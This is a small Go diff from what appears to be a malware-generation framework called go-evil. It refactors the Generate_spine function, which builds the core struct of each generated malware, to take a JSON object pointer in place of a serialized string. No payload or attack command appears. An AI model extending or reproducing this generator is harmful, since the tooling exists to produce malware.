@@ -1,14 +1,13 @@
 package structs
 
 import (
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 	"github.com/TeamPhoneix/go-evil/utility/structure/structs"
 )
 
 // Generates the core struct (read spine) of each malware
-func Generate_spine(s_json string) string {
-	data_object := structure.Receive(s_json)
+func Generate_spine(data_object *json.Json_t) {
 
 	data_object.Add_go_struct(structs.Go_struct_t{
 		Name: "spine_t",
@@ -42,6 +41,5 @@ func Generate_spine(s_json string) string {
 
 	data_object.Add_go_import("os")
 	data_object.Add_go_global("var spine spine_t")
-	return structure.Send(data_object)
 
 }
